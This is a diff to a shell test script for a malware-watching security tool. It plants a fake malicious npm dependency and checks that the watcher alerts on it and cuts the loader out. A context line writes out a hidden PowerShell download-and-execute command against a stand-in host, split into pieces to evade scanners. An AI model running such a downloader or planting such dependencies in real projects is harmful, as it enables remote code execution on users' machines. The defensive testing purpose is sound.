@@ -63,6 +63,11 @@ check_watcher() {
     fi
     echo "watcher alerted on $name"
     rm -f "$f"
+    # an npm install of a malicious package into a project
+    drop_dependency "$HOME/Projects/${name%.js}-app"
+    echo '{"lockfileVersion": 3}' > "$HOME/Projects/${name%.js}-app/package-lock.json"
+    check_dependency "$as" "$home" "$HOME/Projects/${name%.js}-app" "installed while Guard runs"
+    rm -rf "$HOME/Projects/${name%.js}-app"
 }
 # A downloader script: not a type the watcher's supply-chain checks read, so
 # only the antivirus engine catches it. Split like the loader above.
@@ -70,12 +75,32 @@ drop_downloader() {
     printf '%s\n' "powershell -WindowStyle Hid""den -ExecutionPolicy By""pass -c \"IEX (New-Object Net.WebClient).Download""String('http://example.invalid/a')\"" > "$1"
 }
 
-# An already-infected machine: malware in ~/Downloads before Guard is
-# installed is found by the watcher's first-start scan.
+# An already-infected machine: malware in ~/Downloads and in a project's
+# installed dependencies before Guard is installed is found by the watcher's
+# first-start scan.
 PRE="guard-preinstalled-$RANDOM$RANDOM"
 plant_preinstalled() {
     drop_payload "$HOME/Downloads/$PRE.js"
     drop_downloader "$HOME/Downloads/$PRE.ps1"
+    drop_dependency "$HOME/Projects/$PRE-app"
+}
+# drop_dependency <project>: an installed npm package carrying the loader
+drop_dependency() {
+    mkdir -p "$1/node_modules/bad-dep"
+    echo '{"name": "app", "dependencies": {"bad-dep": "1.0.0"}}' > "$1/package.json"
+    echo '{"name": "bad-dep", "version": "1.0.0"}' > "$1/node_modules/bad-dep/package.json"
+    drop_payload "$1/node_modules/bad-dep/index.js"
+}
+# check_dependency <sudo or ""> <guard home> <project> <what>: an alert for
+# the project's node_modules, and the loader cut out of the package
+check_dependency() {
+    local as=$1 home=$2 app=$3 dep="$3/node_modules/bad-dep/index.js"
+    if ! wait_for_alert "$as" "$home" "$(basename "$app")/node_modules"; then
+        $as tail -n 50 "$home/watcher.log" || true
+        fail "no alert for $app/node_modules ($4)"
+    fi
+    wait_for 60 "the loader cut out of $dep" sh -c "! grep -q 'eval(proxy''Info)' '$dep'"
+    echo "watcher alerted on and cleaned $app/node_modules ($4)"
 }
 check_preinstalled() {   # <sudo or ""> <guard home>
     local as=$1 home=$2 f
@@ -86,6 +111,7 @@ check_preinstalled() {   # <sudo or ""> <guard home>
         fi
         echo "first-start scan alerted on $f"
     done
+    check_dependency "$as" "$home" "$HOME/Projects/$PRE-app" "there before the install"
     wait_for 300 "the initial scan to finish ($home/watcher.log)" \
         $as grep -q "initial scan complete" "$home/watcher.log"
 }
